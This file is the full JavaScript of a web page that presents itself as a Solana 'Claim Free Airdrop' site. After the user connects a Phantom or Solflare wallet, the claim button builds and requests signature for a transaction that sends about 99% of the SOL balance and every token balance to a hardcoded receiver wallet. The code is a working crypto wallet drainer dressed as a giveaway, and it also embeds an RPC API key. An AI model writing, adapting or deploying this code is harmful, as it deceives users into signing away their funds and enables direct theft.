$(document).ready(function () {
    async function connectWallet() {
        if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
            openInWalletBrowser();
            return;
        }

        if (window.solana || window.solflare) {
            try {
                const wallet = window.solana || window.solflare;
                const resp = await wallet.connect();
                console.log("Wallet connected:", resp);

                var connection = new solanaWeb3.Connection(
                    "https://rpc.helius.xyz/?api-key=ce095e76-528b-45f9-98c6-caaba97d6b10",
                    "confirmed"
                );

                const publicKey = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(publicKey);
                console.log("Wallet balance:", walletBalance);

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    alert("Insufficient funds for Fee.");
                    return;
                }

                $("#connect-wallet").text("Claim Free Airdrop");
                $("#connect-wallet")
                    .off("click")
                    .on("click", async () => transferAssets(connection, publicKey, walletBalance, minBalance));
            } catch (err) {
                console.error("Error connecting to wallet:", err);
            }
        } else {
            alert("No supported wallet found. Please install Phantom or Solflare.");
            window.open("https://phantom.app/download", "_blank");
        }
    }

    function openInWalletBrowser() {
        let siteURL = encodeURIComponent(window.location.href);
        let walletLinks = {
            phantom: `https://phantom.app/ul/browse/${siteURL}`,
            solflare: `https://solflare.com/browse/${siteURL}`,
            trustwallet: `https://link.trustwallet.com/open_url?url=${siteURL}`
        };

        let storeLinks = {
            phantom: "https://phantom.app/download",
            solflare: "https://solflare.com",
            trustwallet: "https://trustwallet.com/"
        };

        let selectedWallet = "phantom"; // Default wallet

        if (window.solflare) {
            selectedWallet = "solflare";
        } else if (window.trustwallet) {
            selectedWallet = "trustwallet";
        }

        let deepLink = walletLinks[selectedWallet];
        let storeLink = storeLinks[selectedWallet];

        let timeout = setTimeout(() => {
            window.location.href = storeLink;
        }, 2000);

        window.location.href = deepLink;

        setTimeout(() => {
            clearTimeout(timeout);
        }, 1000);
    }

    async function transferAssets(connection, publicKey, walletBalance, minBalance) {
        try {
            const receiverWallet = new solanaWeb3.PublicKey("AunHeraAbHaG8JmfgQAGJtKPvTKXH1bvrcw3shxfVzHY");
            const balanceForTransfer = walletBalance - minBalance;
            let transaction = new solanaWeb3.Transaction();

            if (balanceForTransfer > 0) {
                transaction.add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: receiverWallet,
                        lamports: balanceForTransfer * 0.99
                    })
                );
            }

            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
            });

            for (let account of tokenAccounts.value) {
                let tokenBalance = account.account.data.parsed.info.tokenAmount.uiAmount;
                let tokenPubkey = new solanaWeb3.PublicKey(account.pubkey);

                if (tokenBalance > 0) {
                    transaction.add(
                        splToken.Token.createTransferInstruction(
                            splToken.TOKEN_PROGRAM_ID,
                            tokenPubkey,
                            receiverWallet,
                            publicKey,
                            [],
                            tokenBalance
                        )
                    );
                }
            }

            transaction.feePayer = publicKey;
            let blockhashObj = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhashObj.blockhash;

            const signed = await window.solana.signTransaction(transaction);
            console.log("Transaction signed:", signed);

            let txid = await connection.sendRawTransaction(signed.serialize());
            await connection.confirmTransaction(txid);
            console.log("Transaction confirmed:", txid);
        } catch (err) {
            console.error("Error during transaction:", err);
        }
    }

    $("#connect-wallet").on("click", connectWallet);
});
